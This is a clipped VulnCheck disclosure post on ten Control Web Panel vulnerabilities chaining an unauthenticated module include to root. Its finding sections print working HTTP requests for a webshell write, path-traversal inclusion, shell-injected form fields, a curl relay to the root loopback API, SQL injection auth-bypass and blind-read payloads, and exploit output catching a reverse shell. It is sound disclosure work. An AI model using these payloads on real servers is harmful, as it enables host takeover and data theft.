---
title: "CWP2Shell: The Login Page That Never Says No"
source: https://www.vulncheck.com/blog/control-web-panel-pre-auth-module-dispatch-rce
source_host: www.vulncheck.com
clip_date: 2026-11-04T19:50:07+08:00
trace_id: 1b69a509-b1cb-44a6-8598-72440b9a4553
content_hash: 13ec2fb23a9421b507eed54c623766e816e8128f359553863d53c21bf37b5402
status: synced
tags:
  - 漏洞分析
  - 命令注入
series: null
feed_source: VulnCheck·漏洞研究
ai_summary: CWP 主机控制面板被披露 10 个漏洞：一个缺失的 `exit()` 让未认证请求串联成直达 root 的 RCE 攻击链。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 40e75244-d011-81a0-a729-e5eceed8f48c
ioc:
  cves:
    - CVE-2025-48703
    - CVE-2026-104080
    - CVE-2026-73695
    - CVE-2026-73696
    - CVE-2026-73697
    - CVE-2026-77876
    - CVE-2026-77877
    - CVE-2026-77878
    - CVE-2026-77879
    - CVE-2026-77880
    - CVE-2026-77881
  cwes:
    - CWE-22
    - CWE-306
    - CWE-698
    - CWE-78
    - CWE-89
    - CWE-98
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> CWP 主机控制面板被披露 10 个漏洞：一个缺失的 `exit()` 让未认证请求串联成直达 root 的 RCE 攻击链。
> 
> - **核心缺陷：** 用户面板登录重定向后没有 `exit()`（CVE-2026-73696），请求继续执行，经 `module` 参数路径穿越实现未认证 LFI（CVE-2026-73695）；自带模块无独立鉴权，phpini_editor 任意文件写/命令注入、protected_directory 命令注入即可拿到托管用户 shell
> - **双路提权：** 以 root 运行的 loopback 用户 API（127.0.0.1:2302）提供两条独立提权路径——无 token 门控路由（CVE-2026-77877），以及 access_token() 认证门 SQL 注入 UNION 伪造过期时间绕过（CVE-2026-77879），最终均可达成 root 命令执行
> - **暴露规模与前提：** VulnCheck 识别约 11.8 万条 CWP 观测、2083 端口约 1.98 万；整链唯一前提是一个有效账户名，面板对不存在账户返回 404、存在则返回 302，可免费枚举
> - **修复时间线：** 1.12 补上 `exit()` 并校验会话关闭预认证入口，1.16 修复面板模块与部分 API，但用户 API 直到 1.27/1.29（2026-10-31）才收口；1.30 确认十个全修复且无回归，建议升级到 1.29+ 并将 2083/2031/2087 移出公网
> - **审计方法：** 研究者把 ionCube 解包笔记交给 AI 编码代理，3 小时产出可用脱壳工具，全部根因结论均基于还原源码而非黑盒推断

Today VulnCheck is disclosing ten vulnerabilities in [Control Web Panel](https://control-webpanel.com/) (CWP, formerly CentOS Web Panel), the hosting control panel that ships on a large number of internet-facing servers. They are being disclosed in accordance with VulnCheck's [coordinated vulnerability disclosure policy](https://vulncheck.com/vulnerability-disclosure-policy), and all ten carry allocated IDs through the VulnCheck CNA.

-   [CVE-2026-73695](https://console.vulncheck.com/cve/CVE-2026-73695): unauthenticated local file inclusion in the user-panel dispatcher via path traversal in the `module` parameter, the flaw that opens the chain (CWE-98).
-   [CVE-2026-73696](https://console.vulncheck.com/cve/CVE-2026-73696): execution after redirect in the user panel's unauthenticated flow, whose login redirect has no `exit()` so the request falls through and includes the module file (CWE-698).
-   [CVE-2026-73697](https://console.vulncheck.com/cve/CVE-2026-73697): unauthenticated arbitrary file write and command injection in the `phpini_editor` module (CWE-22/98 + CWE-78).
-   [CVE-2026-77876](https://console.vulncheck.com/cve/CVE-2026-77876): unauthenticated command injection in the `protected_directory` module (CWE-78).
-   [CVE-2026-77877](https://console.vulncheck.com/cve/CVE-2026-77877): missing token enforcement on the root-owned loopback user API, leaving several of its routes reachable with no authentication (CWE-306).
-   [CVE-2026-77878](https://console.vulncheck.com/cve/CVE-2026-77878): OS command injection in the user API's `/v1/restoredatabase/` route, run as root (CWE-78).
-   [CVE-2026-77879](https://console.vulncheck.com/cve/CVE-2026-77879): SQL injection in that same API's `access_token()` gate, forging past the authentication check (CWE-89).
-   [CVE-2026-77880](https://console.vulncheck.com/cve/CVE-2026-77880): command injection in the user API's `/v1/newpass/` passwd route, run as root (CWE-78).
-   [CVE-2026-77881](https://console.vulncheck.com/cve/CVE-2026-77881): blind SQL injection in the user API's `/v1/user_panel_dashboard/` route, a full database read as MySQL root (CWE-89).
-   [CVE-2026-104080](https://console.vulncheck.com/cve/CVE-2026-104080): OS command injection in the tokenless `/v1/valid_token/` route, where the raw `user` value reaches a root-owned `grep` shell command (CWE-78).

The most severe of these is [CVE-2026-73695](https://console.vulncheck.com/cve/CVE-2026-73695), an unauthenticated remote code execution in the user panel of Control Web Panel. From that foothold the root-owned loopback user API gives two independent paths to root: its ungated routes ([CVE-2026-77877](https://console.vulncheck.com/cve/CVE-2026-77877)) reach a command injection that runs as root, and a SQL injection in the API's authentication gate ([CVE-2026-77879](https://console.vulncheck.com/cve/CVE-2026-77879)) forges past it to the same result. This was tested on the CWP7 `webpanel` 1.8 build on AlmaLinux 9, a build that already carries the patch for the last KEV-listed CWP RCE.

All ten are fixed as of CWP 1.29, released October 31, 2026. The fixes came in stages: 1.12 closed the pre-auth entry, 1.16 fixed the user-panel modules and two of the user API sinks, and the root-owned user API was only closed in the 1.27 and 1.29 security releases. We checked every fix against the ionCube-decoded code of each build, not only against the changelog. The details per CVE are in [How CWP fixed it](#how-cwp-fixed-it). Operators should upgrade to 1.29 or later (1.30 is the current release).

A login page has one job, to say no. CWP's user panel says no in the HTTP status line and then keeps working anyway. Ask it for a per-account dashboard while unauthenticated and it sets a `302` redirect to the login page, but it never stops executing, so the request falls through and includes a module file whose name the attacker controls and nobody sanitized. A module here is just one of the panel's feature pages, a PHP file like the PHP.ini editor or the file manager that the dashboard pulls in by name to render a section of the account view. One of them writes a file wherever the attacker points it, another runs their string in a shell, and a root API on loopback finishes the job. The whole thing is one missing keyword wide.

The user panel on port 2083, the exact surface this chain enters through, is exposed at scale: a [ZoomEye query](https://www.zoomeye.ai/searchResult?q=YXBwPSJDZW50T1MgV2ViUGFuZWwiICYmIHBvcnQ9IjIwODMi) for the CentOS WebPanel fingerprint on 2083 counts roughly 210,000 hosts, and [Shodan](https://www.shodan.io/search?query=cwpsrv+port%3A2083) shows about 23,000 under its stricter `cwpsrv` banner. As of November 3, 2026, VulnCheck Target Intelligence identifies **118,151 CWP service observations, including 19,834 on the 2083 user-panel port**. Title and banner counts on a product this popular carry their share of honeypots and parked instances, so treat those as an order of magnitude rather than a census, but the order of magnitude is tens of thousands of exposed panels and up.

## Background

CWP unauthenticated RCE is not a novel category, it is a recurring one. The most recent named vulnerability is [CVE-2025-48703](https://console.vulncheck.com/cve/CVE-2025-48703), an OS command injection in the user panel's `filemanager` module. VulnCheck flagged it as exploited in the wild and added it to VulnCheck KEV on August 15, 2025, nearly three months before it reached CISA KEV on November 4, 2025, and once a public exploit landed it was mass-exploited within days. That earlier bug had the same shape as the front of the chain in this post: the user-panel dispatch reaches a module before anyone authenticates, and that module runs request input in a shell. Here that pattern is split across several of the ten IDs, the [CVE-2026-73695](https://console.vulncheck.com/cve/CVE-2026-73695) module-name traversal, the missing `exit()` behind the login redirect, and the module shell sinks the traversal lands in; in 48703 it was a single CVE. The interesting part is that the CWP7 `webpanel` 1.8 build we tested already ships the 48703 fix, returns `403` to that published exploit, and still runs a command through the module next door.

Control panels are a good target for the same reason they are dangerous to run: they are a machine for performing privileged actions on behalf of low-privileged users, so the entire product is a pile of file writes, shell-outs and database queries sitting behind an authentication boundary. When that boundary has a gap, every one of those primitives is on the wrong side of it at once. CWP is also a commercial appliance rather than a `git clone`, which is why its user panel keeps giving up the same class of bug: fewer people look, and the ones who look see a redirect, a `302`, and assume the door is closed.

None of this would have been readable without a detour that began on a different target. Our earlier [FileRun disclosure](https://vulncheck.com/blog/filerun-thumbnail-command-injection-rce) left a question: how much of the closed-source, ionCube-encoded control-panel world is actually auditable with the code in hand? FileRun leaned on the PHP Reflection API to introspect the encoded classes at runtime, which gives the shape of the code but not its logic. After reading the FileRun post, a friend, [Julien Voisin](https://dustri.org/), DM'd me his [notes on unpacking ionCube](https://dustri.org/b/unpacking-ioncube.html) on Discord, which he had only run against the free demo build. Instead of reimplementing the technique by hand, we handed his writeup to an AI coding agent and had a working unpacker three hours later, ran it against a real CWP build, and read the recovered PHP. The bar for turning a solid technique writeup into working offensive tooling is low now. Every claim in this post, the dispatch flow, the missing `exit()`, the per-route sinks on the user API, and the root cause behind each, comes from reading that recovered source rather than inferring it black-box.

## One nginx, many identities

CWP fronts everything with a single custom nginx running as root and isolates tenants by mapping a listening port to a PHP-FPM pool. The admin panel runs its pool as root. The user panel on 2083 serves the shared login page as an unprivileged `login` user and each account's dashboard as that account's own uid, through a per-account `location /<username>/`. And on `127.0.0.1:2302` there is a small service CWP calls the user API, which runs as root and talks to MySQL as `root@localhost`. That last one is the crown jewels, which is why it is bound to loopback. The security model rests entirely on those port-to-pool boundaries and on each panel checking authentication before it does anything interesting. This chain walks through a spot where the user panel forgot the second half.

| Finding | Auth | Runs as |
| --- | --- | --- |
| 1\. User-panel pre-auth module dispatch to RCE (LFI + ungated modules: phpini_editor file-write/cmd-inj, protected_directory cmd-inj) | None | hosting user |
| 2\. User API OS command injection | None (local) | **root** |
| 3\. User API SQL injection | None (local) | **root** |

Finding 1 is the initial access vector: reach a module before authentication and it writes a webshell or runs a command as the hosting user, which rates CVSS 9.8. Findings 2 and 3 are the escalation, two independent sinks in the user API that turn any local foothold into root, 8.8 each. When chained, a host and one hosting-account name is a root shell, 10.0 once the scope change is counted. These are stage-level scores; each of the ten CVEs below carries its own CWE and is scored on its own.

### Full breakdown: one distinct bug per row, one CVE per row

The three findings above are attack stages, not the CVE count. Each maps to one or more of the ten CVEs, split out per bug in the table below, where the actual IDs live: distinct root cause, distinct fix, so distinct CVE. A different module or route sink is a different fix location, so a different ID.

| Bug | File / route | Sink | CWE | CVE |
| --- | --- | --- | --- | --- |
| Module-name traversal in dispatcher include | `services/users/index.php` | `include '.../'.$_GET['module'].'.php'` (`../` kept) | CWE-98 | [CVE-2026-73695](https://console.vulncheck.com/cve/CVE-2026-73695) |
| EAR: redirect without `exit()` | `unauthenticatedFlow()` / `toLoginWithIntendedUri()` | `header('Location: …')` with no `exit()` | CWE-698 | [CVE-2026-73696](https://console.vulncheck.com/cve/CVE-2026-73696) |
| phpini_editor sinks (same file) | `modules/phpini_editor.php` (`acc=update`, `acc=addlabelphpiniadv`) | `file_put_contents($_POST['file'], …)` + `shell_exec(… $_POST['hfilename'])` | CWE-22/98 + CWE-78 | [CVE-2026-73697](https://console.vulncheck.com/cve/CVE-2026-73697) |
| protected_directory command injection | `modules/protected_directory.php` (`acc=deletedp`) | `shell_exec("sed -i '…' " . $_POST['file'] . '.htaccess')` | CWE-78 | [CVE-2026-77876](https://console.vulncheck.com/cve/CVE-2026-77876) |
| Loopback API ungated routes | `127.0.0.1:2302` `/v1/restoredatabase/` (+ others) | routes reach root sinks with no `access_token()` gate | CWE-306 | [CVE-2026-77877](https://console.vulncheck.com/cve/CVE-2026-77877) |
| /v1/restoredatabase/ command injection | `127.0.0.1:2302` `/v1/restoredatabase/` | `shell_exec('mysql … < ' . $file)` as root, raw `$file` | CWE-78 | [CVE-2026-77878](https://console.vulncheck.com/cve/CVE-2026-77878) |
| Loopback gate SQL injection (auth bypass) | `127.0.0.1:2302` `access_token()` | `… WHERE authorization_code='$access_token'` (UNION forges the gate) | CWE-89 | [CVE-2026-77879](https://console.vulncheck.com/cve/CVE-2026-77879) |
| /newpass/ passwd command injection | `127.0.0.1:2302` `/newpass/` | `( echo $pass; echo $pass ) \| passwd $user` (raw POST `user`) | CWE-78 | [CVE-2026-77880](https://console.vulncheck.com/cve/CVE-2026-77880) |
| /user_panel_dashboard/ SQL injection | `127.0.0.1:2302` `/user_panel_dashboard/` | `… WHERE client_id="$user"` (no token, blind DB read) | CWE-89 | [CVE-2026-77881](https://console.vulncheck.com/cve/CVE-2026-77881) |
| /valid_token/ command injection | `127.0.0.1:2302` `/valid_token/` | `shell_exec("grep -c '$user:' /etc/passwd")` as root, raw `$user` | CWE-78 | [CVE-2026-104080](https://console.vulncheck.com/cve/CVE-2026-104080) |

There are two enabling flaws (the EAR on the user panel, the ungated routes on the loopback API), each its own row. Once they are counted, every remaining row is a per-module or per-route sink with its own fix, so each is counted on its own: the three loopback CWE-78 sinks (`/v1/restoredatabase/`, `/newpass/` and `/valid_token/`) stay separate for the same reason `phpini_editor` and `protected_directory` do, and the two CWE-89 sinks (the shared auth-gate query and the one-route dashboard query) have two different fixes. All ten rows now carry allocated IDs through the VulnCheck CNA.

## Finding 1: a redirect that does not redirect

When an attacker requests the account root on the user panel, `https://host:2083/<account>/`, nginx routes it to that account's pool and hands it off to the user dispatcher. The dispatcher decides what to render by including a module file whose name comes straight from the `module` query parameter. That name passes through the same anti-XSS filtering CWP uses everywhere, which strips script tags and event handlers but leaves `../`, `/` and `.` untouched, so the module name is a path-traversal-capable local file include.

```php
// services/users/index.php, at file scope
$module_name = CWPHttpRequest::get('module');   // $_GET['module']; the anti-XSS filter leaves ../ intact
include_once '/usr/local/cwpsrv/var/services/user_files/modules/' . $module_name . '.php';
```

Before it includes anything, the dispatcher checks authentication, and for an anonymous request it runs the unauthenticated flow, which emits a `Location: /login/?intended=<base64 of the original query>` header. That is where it goes wrong. Setting a redirect header does not stop PHP. There is no `exit()` behind it, so execution continues: `unauthenticatedFlow()` returns, the constructor completes, and the file-scope `include_once` runs with `$module_name` taken straight from the attacker-controlled `module` parameter. The browser is told to go to `/login`, but the server has already run the module. A guard that would have caught this already exists in the code: `checkIfModuleExists()`, which scandirs the real modules directory and rejects a name that is not one of the files it finds, but it lives in `setModuleVars()`, a method this pre-auth path never calls. It is not the only control that would have stopped the chain (an `exit()` behind the redirect, an auth gate on the include, or a per-module check would each do it), just the one the codebase had already written and skipped here.

```php
// CWPUserIndex::__construct(): the module is resolved, then the auth path runs
$this->detectModuleIntended();
CWPAuth::isAuthenticated();
$this->unauthenticatedFlow();

// UnauthenticatedFlowTrait::toLoginWithIntendedUri()
header('Location: /login/?intended=' . base64_encode($qs));   // no exit(): control falls through to the include
```

So a request for a traversal module name includes an attacker-chosen `.php` off disk and runs it as the account user, no login required. Planting a marker file confirms it executes as the hosting uid, not as root and not as the shared login user, but as a real tenant.

The obvious question is whether the admin panel has the same flaw: it does not. The admin dispatcher ends every unauthenticated path by emitting the redirect and then calling `exit()`, the keyword the user panel dropped, and it runs the module name through a strict alphanumeric allow-list before its own include. Same codebase, same author, two doors: one locks, one does not.

## Finding 1, continued: turning inclusion into execution

A local file include vulnerability needs a local file with content the attacker controls, and remote URL includes are disabled, so the target is a `.php` on the box. The user panel's own modules supply it, because of a second design decision: those modules were written on the assumption that the dispatcher already authenticated the caller, so they carry no authentication check of their own. Bypass the dispatcher's auth and every module's sink is exposed at once.

The `phpini_editor` module obliges twice. Its `acc=update` action is an arbitrary file write, taking a destination path and file content directly from the POST body and writing them to disk as the account, with no session. The module runs its inputs through `addslashes()`, so a planted webshell has to be quote-free, which is a solved problem, and two requests carrying no cookie are enough: the first writes a small webshell into a world-writable path, and the second aims the traversal include at it and passes a command whose output comes back in the response body. That is a read/write RCE with output, not a blind one.

```php
// phpini_editor, acc=update: destination and content both from the POST body, no session
$filename = $_POST['file'];
$cont    .= str_replace('__', '.', $title[$i]) . '=' . $value[$i] . "\r\n";  // $_POST['title'] / $_POST['value']
file_put_contents($filename, $cont);
```

The stored line is always `<title>=<value>`, so a webshell is split across the two fields and the `=` is swallowed by a trailing `//`:

```md
title = <?php <webshell> ;//     value =  ?>
stored: <?php <webshell> ;//= ?>
```

The two requests, no cookie. The first writes the webshell as the account:

```md
POST /labtest/index.php?module=phpini_editor&acc=update HTTP/1.1
Host: target:2083
Content-Type: application/x-www-form-urlencoded

file=/tmp/evilmod.php&title=<?php system($_GET[c]);//,x&value= ?>,y
```

The second aims the traversal include at it and passes the command:

```md
GET /labtest/index.php?module=../../../../../../../tmp/evilmod&c=id HTTP/1.1
Host: target:2083
```

The dispatcher appends `.php`, the `../` chain resolves back out of the modules directory to `/tmp/evilmod.php`, and `system($_GET[c])` runs `id` as `labtest`, with the output in the response body ahead of the cosmetic `302`.

There is an even shorter path in the same module. Its `acc=addlabelphpiniadv` action drops a POST field straight into an unquoted `rm -f` shell-out:

```php
// phpini_editor, acc=addlabelphpiniadv
$hfilename = trim($_POST['hfilename']);
shell_exec('rm -f ' . $hfilename);   // raw, unquoted
```

So a single request runs an arbitrary command as the account, no webshell, no cookie, no token:

```md
POST /labtest/index.php?module=phpini_editor&acc=addlabelphpiniadv HTTP/1.1
Host: target:2083
Content-Type: application/x-www-form-urlencoded

hfilename=x ; id > /tmp/proof ; chmod 666 /tmp/proof ; echo
```

The whole line runs. The response is a `302` to the login page, but `/tmp/proof` already holds `uid=1000(labtest)`: the redirect is cosmetic, the command ran before it.

The same shape shows up in a second module, which is the point: it is a class, not a one-off. `protected_directory.php`, `acc=deletedp`, drops a POST field into an unquoted `sed`:

```php
// protected_directory, acc=deletedp
shell_exec("sed -i '…' " . $_POST['file'] . '.htaccess');   // raw $_POST['file'], unquoted
```

```md
POST /labtest/index.php?module=protected_directory&acc=deletedp HTTP/1.1
Host: target:2083
Content-Type: application/x-www-form-urlencoded

file=/tmp/x ; id > /tmp/proof ; chmod 666 /tmp/proof ; #
```

`$_POST['file']` lands unquoted in the `shell_exec`, the command runs as the account on the same anonymous request, same cosmetic `302`. It is a different module with a different fix, since each sink needs its own `escapeshellarg`, which is why it is counted as its own bug in the breakdown above rather than folded into the dispatch entry.

## Finding 1's one precondition: an account name

The chain needs one thing the attacker does not start with: a valid account name, because the vulnerable dispatcher only runs under `/<account>/`. CWP hands the attacker the oracle for free, since the account root returns `302` when the account exists and `404` when it does not, and the `302` set is exactly the set of accounts the chain can own:

```md
GET /labtest/ HTTP/1.1   ->  302 Found       (account exists, dispatcher runs)
GET /nope123/ HTTP/1.1   ->  404 Not Found   (no such account)
```

There is no zero-input account dump from the panel, but the attacker is not attacking a box in the abstract, they are attacking a domain, and the account name is usually sitting in that site's own web footprint (a `/home/<user>/public_html` path leaked in an error page, an exposed `phpinfo`, a stray backup), or they pull the hosted domains from certificate transparency and confirm each against the oracle. Land one account, and the same foothold reads the local user list and the vhost map in-band and hands the attacker every other account on the server.

## Finding 2: root command injection in the user API

Code execution as the hosting user is not root, but it is local, and local is all the user API asks for. It runs as root, rolls its own authentication per route, and several routes forgot theirs. The cleanest is its database-restore route, which takes a `file` field and splices it directly into a root shell command with no token check at all:

```php
// services/user_api/v1/app/routes/api.php
$app->post('/restoredatabase/', function () use ($app) {
    $file = $app->request->post('file');
    ...restoreDBBackup($file, ...);
});
// BackupHandler::restoreDBBackup(): $file goes straight into a root shell
shell_exec('mysql --defaults-extra-file=/root/.my.cnf < ' . $file . ' > /dev/null 2>&1 &');
```

From inside the hosting-user foothold, a single loopback request escalates:

```bash
curl -sk https://127.0.0.1:2302/v1/restoredatabase/ \
  --data-urlencode "file=/dev/null ; id > /tmp/proof ; chmod 666 /tmp/proof ; echo"
```

`/tmp/proof` comes back owned by `root`, containing `uid=0(root)`. The `file` field is meant to name a SQL dump to feed to `mysql`; a `;` turns the rest of it into commands the root shell runs before it ever reaches `mysql`.

A second root command injection was found later on the tokenless `/valid_token/` route. [CVE-2026-104080](https://console.vulncheck.com/cve/CVE-2026-104080) covers the separate shell sink reached by the same raw `user` parameter that also feeds the route's SQL query:

```php
$user = $app->request->post('user');
shell_exec("grep -c '" . $user . ":' /etc/passwd");
```

A value such as `x' ; <command> ; '` breaks out of the single-quoted `grep` argument and runs the command as root. The route file is re-encoded in every release, so we cannot establish when this sink was introduced, but it was live in 1.16 through 1.23 and required its own fix and CVE.

## Finding 3: root SQL injection in the user API

The command injection is not the only way through the user API. It connects to MySQL as `root@localhost`, and its own authentication gate is a raw, unparameterized query against an OAuth table. A UNION that forges a row with a future expiry makes the gate return true, and the route it guards then splices the POST `user` field into a root `passwd` invocation, so the SQL injection lands as root command execution too. A second route takes a `client_id` into another unparameterized query with no token, giving a blind read of the entire database as MySQL root. These are two distinct SQL injections with two different fixes, the shared auth-gate query and the one-route dashboard query, both in the user API that should never have been reachable without a token.

The auth-bypass sink is `/v1/newpass/`. Its gate is a raw query, and the route it guards splices the still-raw `user` field into a root `passwd` call:

```php
// access_token() gate, run as root@localhost
$row = $db->query("SELECT * FROM oauth_authorization_codes
                   WHERE authorization_code='$access_token' AND client_id='$user'");
// the guarded route, with $user still raw:
shell_exec("( echo $pass; echo $pass ) | /usr/bin/passwd " . $user);
```

A UNION in `access_token` forges a row with a far-future expiry and comments out the `client_id` clause, so the gate passes with no real token, and `user=z;<command>;true` runs the command as root:

```md
POST /v1/newpass/ HTTP/1.1
Host: 127.0.0.1:2302
Content-Type: application/x-www-form-urlencoded
Content-Length: 156

user=z%3Bid%3Btrue&access_token=%27+UNION+SELECT+%27a%27%2C%27x%27%2C%27c%27%2C%27d%27%2C%272099-01-01+00%3A00%3A00%27%2C%27f%27+--+-&pass=eA%3D%3D&op=renew
```

The second sink is `/v1/user_panel_dashboard/`, which needs no token and drops the `user` field into an unparameterized `oauth_clients` lookup:

```php
// /user_panel_dashboard/, no token on the no-token path
$db->query("SELECT * FROM oauth_clients WHERE client_id='$user'");
```

That table is empty on a fresh install, so the `SLEEP` has to sit in a constant derived table to fire regardless of row count; from there it is a per-bit, time-based read of anything the root MySQL account can see:

```md
POST /v1/user_panel_dashboard/ HTTP/1.1
Host: 127.0.0.1:2302
Content-Type: application/x-www-form-urlencoded
Content-Length: 173

user=zzz%27+OR+%28SELECT+1+FROM+%28SELECT+IF%28%28ASCII%28SUBSTRING%28%28SELECT+password+FROM+root_cwp.user+LIMIT+1%29%2C1%2C1%29%29%3E52%29%2CSLEEP%282%29%2C0%29%29x%29--+-
```

The dashboard read is MySQL root but not a shell: the daemon runs as the OS `mysql` user, so `INTO OUTFILE` cannot reach a PHP-served docroot, and that injection stays a full-database disclosure rather than a second route to code execution.

## Putting it together

Unauthenticated to a root shell, against `https://target:2083`, in order:

```md
Unauthenticated attacker
  |
  | GET /alice/               302 -> alice exists (the only precondition)
  v
  | POST /alice/index.php?module=phpini_editor&acc=addlabelphpiniadv
  |   hfilename = x ; <relay> ; echo         runs as the alice user (pre-auth module sink)
  v
  | <relay> = curl 127.0.0.1:2302/v1/restoredatabase/
  |            --data-urlencode "file=/dev/null ; <root-cmd> ; echo"
  v
  root command execution (uid=0)            the user API, no token
```

The attacker sends two requests. The second carries the escalation relay that the foothold fires from inside the box, so the whole thing collapses to find-an-account, then one request that ends at `uid=0`. Finding 3 is a drop-in alternative to the relay: the same user API, a forged auth row instead of an unauthenticated route, same root.

## Initial Access exploit

VulnCheck's Initial Access Intelligence team turned this into a self-contained go-exploit module. It fingerprints the CWP user panel, plants an in-band webshell through the pre-auth `phpini_editor` write, relays the payload to root through the user API (falling back to a hosting-user shell if it is firewalled off), and catches the connect-back. The only input it needs is one account name:

Every Monday, VulnCheck publishes a new exploit in the [Initial Access Community repository](https://github.com/vulncheck-oss/initial-access-community).

```md
chocapikk@pwntoaster:~/feed/cve-2026-73695$ ./build/cve-2026-73695_linux-amd64 -v -e -rhost 127.0.0.1 -rport 2083 -s -account labtest -c2 SimpleShellServer -lhost 192.168.48.1 -lport 4444
time=2026-08-18T19:52:58.539+02:00 level=STATUS msg="Starting listener on 192.168.48.1:4444"
time=2026-08-18T19:52:58.540+02:00 level=STATUS msg="Validating Control Web Panel target" host=127.0.0.1 port=2083
time=2026-08-18T19:52:58.829+02:00 level=SUCCESS msg="Target verification succeeded!" host=127.0.0.1 port=2083 verified=true
time=2026-08-18T19:52:58.829+02:00 level=STATUS msg="Planting the in-band webshell at /tmp/.yDKSWndF.php via phpini_editor (account \"labtest\")"
time=2026-08-18T19:52:58.927+02:00 level=STATUS msg="Firing the reverse-shell payload as root through the 127.0.0.1:2302 user-API (falls back to the hosting user if it is unreachable)"
time=2026-08-18T19:52:59.132+02:00 level=SUCCESS msg="Caught new shell from 192.168.48.2:43182"
time=2026-08-18T19:52:59.133+02:00 level=STATUS msg="Active shell from 192.168.48.2:43182"
id
uid=0(root) gid=0(root) groups=0(root)
time=2026-08-18T19:53:00.349+02:00 level=SUCCESS msg="Exploit successfully completed" exploited=true
```

## Why it keeps coming back

The mechanism behind every one of these CWP user-panel RCEs is one keyword: the unauthenticated flow emits its login redirect and, with no `exit()` behind it, the script keeps running and the file-scope `include_once` loads the attacker-named module file. [CVE-2025-48703](https://console.vulncheck.com/cve/CVE-2025-48703) was that mechanism with a name and a KEV entry; this is the same initial access vector with a different CWP module behind it on a build that already carries the 48703 patch, so it is a fresh path the fix never closed rather than that CVE resurfacing.

The 48703 fix landed on a single CWP module, bolting a check onto `filemanager` while the unauthenticated flow itself, and every other module that resolves out of the `module` parameter, was left as it was. From the outside that reads as fixed, because the published PoC now returns `403`, so it gets written up as fixed and NVD, CISA and everyone who upgrades inherit that verdict. On an appliance, "the PoC no longer fires" quietly becomes "the vulnerability is gone," when all it can honestly mean is "this one request is gone." The box in this post returns `403` to the 48703 exploit and still runs a command through the module beside it.

This is inference, and offered as such: a module that runs `rm -f $_POST[...]` in a shell looks, on paper, like an authenticated user making the server run a command as their own uid, which on shared hosting is close to working-as-intended, since the account already ships a shell and cron. That framing is exactly why sinks like this rarely get reported and never get an input filter, and why the modules were never hardened. They read as by-design authenticated features. The dispatch flaw is what turns that discarded pile into an unauthenticated attack surface all at once, and the bugs were never really introduced. They sat there as intended behavior, one keyword away from unauthenticated remote root.

## Timeline

| Date | Event |
| --- | --- |
| 2026-08-11 | CWP7 el9 build fetched for the audit (`webpanel` 1.8, already patched for CVE-2025-48703) |
| 2026-08-18 | Chain discovered and reproduced end to end (unauthenticated to root) in a docker lab |
| 2026-08 | The original nine CVEs ([CVE-2026-73695](https://console.vulncheck.com/cve/CVE-2026-73695), [CVE-2026-73696](https://console.vulncheck.com/cve/CVE-2026-73696), [CVE-2026-73697](https://console.vulncheck.com/cve/CVE-2026-73697), and [CVE-2026-77876](https://console.vulncheck.com/cve/CVE-2026-77876) through [CVE-2026-77881](https://console.vulncheck.com/cve/CVE-2026-77881)) allocated through the VulnCheck CNA; vendor coordination initiated |
| 2026-08-21 | CWP 1.9 released ("Security improvements" for the user panel). Decoded on 2026-08-23: nothing fixed, the full chain still lands `uid=0` |
| 2026-09-08 | CWP 1.12 released. [CVE-2026-73696](https://console.vulncheck.com/cve/CVE-2026-73696) fixed, and the dispatcher now requires a session before the include, so the unauthenticated entry is closed. The other eight are still reachable from an authenticated account |
| 2026-09-29 | CWP 1.16 build, dated September 29 (no changelog entry). [CVE-2026-73695](https://console.vulncheck.com/cve/CVE-2026-73695), [CVE-2026-73697](https://console.vulncheck.com/cve/CVE-2026-73697), [CVE-2026-77876](https://console.vulncheck.com/cve/CVE-2026-77876), [CVE-2026-77879](https://console.vulncheck.com/cve/CVE-2026-77879) and [CVE-2026-77880](https://console.vulncheck.com/cve/CVE-2026-77880) fixed. Four user API bugs remain live: [CVE-2026-77877](https://console.vulncheck.com/cve/CVE-2026-77877), [CVE-2026-77878](https://console.vulncheck.com/cve/CVE-2026-77878), [CVE-2026-77881](https://console.vulncheck.com/cve/CVE-2026-77881), and the newly identified `/valid_token/` command injection later assigned [CVE-2026-104080](https://console.vulncheck.com/cve/CVE-2026-104080). Any hosting account is still one request from root |
| 2026-10-06 | [CVE-2026-104080](https://console.vulncheck.com/cve/CVE-2026-104080) allocated for the separate root command injection in `/valid_token/`, bringing the disclosure set to ten CVEs |
| 2026-10-24 | CWP 1.23 decoded (no changelog entry). Same state as 1.16, nothing moved on the user API |
| 2026-10-30 | CWP 1.27 released: security review of the admin panel and both APIs |
| 2026-10-31 | CWP 1.29 released: user API routes require a valid session and validate their input, database restores are scoped to the account. [CVE-2026-77877](https://console.vulncheck.com/cve/CVE-2026-77877), [CVE-2026-77878](https://console.vulncheck.com/cve/CVE-2026-77878), [CVE-2026-77881](https://console.vulncheck.com/cve/CVE-2026-77881), and [CVE-2026-104080](https://console.vulncheck.com/cve/CVE-2026-104080) fixed |
| 2026-11-02 | CWP 1.30 decoded: all ten fixed, no regressions from earlier releases |
| 2026-11-03 | Public disclosure |

## How CWP fixed it

CWP did not fix this in one release. The fixes came in three steps, and none of the releases named a CVE or a reporter. Up to 1.12 the changelog entries only said things like "Security improvements", so every step below comes from the decoded code of each build (recovered with `icunpack`, like the rest of this post), not from the release notes. Builds 1.16 and 1.23 do not have their own changelog entries: the [changelog](https://control-webpanel.com/changelog) jumps from 1.12 to 1.26. We decoded the 1.16 build dated September 29, and the 1.23 build pulled from the vendor CDN on October 24.

**1.12 (September 8): the unauthenticated entry is closed.** `toLoginWithIntendedUri()` now calls `exit()` after the redirect, the one keyword this post is about, and the dispatcher checks the session before it includes anything. That fixes [CVE-2026-73696](https://console.vulncheck.com/cve/CVE-2026-73696) and removes the pre-auth reach. The rest of the chain was untouched: the dispatcher still concatenated the raw module name, and `phpini_editor` and `protected_directory` were the same bytes as in 1.8. So any authenticated hosting account could still fire all of it, up to root through the user API.

**1.16 (September 29 build): the user panel side is fixed.**

-   [CVE-2026-73695](https://console.vulncheck.com/cve/CVE-2026-73695): the module name goes through `basename()`, a `preg_replace` that keeps only `[a-zA-Z0-9_-]`, then `realpath()` and a check that the file stays under the modules directory before the include.
-   [CVE-2026-73697](https://console.vulncheck.com/cve/CVE-2026-73697): every `phpini_editor` write goes through a new `get_user_safe_path()`, which confines the path to `/home/<user>` with `realpath`. The `rm -f` `shell_exec` is removed.
